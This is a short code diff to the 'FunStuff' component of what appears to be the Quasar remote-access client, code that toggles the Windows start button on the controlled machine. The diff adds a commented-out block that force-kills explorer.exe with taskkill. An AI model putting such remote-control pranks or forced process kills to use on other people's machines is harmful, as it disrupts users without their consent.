@@ -1,4 +1,6 @@
-﻿using System.Runtime.InteropServices;
+﻿using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
 
 namespace Quasar.Client.FunStuff
 {
@@ -29,6 +31,18 @@ namespace Quasar.Client.FunStuff
                     ShowWindow(startButtonHandle, SW_SHOW);
                 }
             }
+
+            //Process[] explorer = Process.GetProcessesByName("explorer");
+            //if (explorer.Length > 0)
+            //{
+            //    Debug.WriteLine("Explorer is running");
+            //    Process.Start("taskkill", "/f /im explorer.exe");
+            //}
+            //else
+            //{
+            //    Debug.WriteLine("Starting explorer");
+            //    Process.Start("explorer.exe");
+            //}
         }
     }
 }
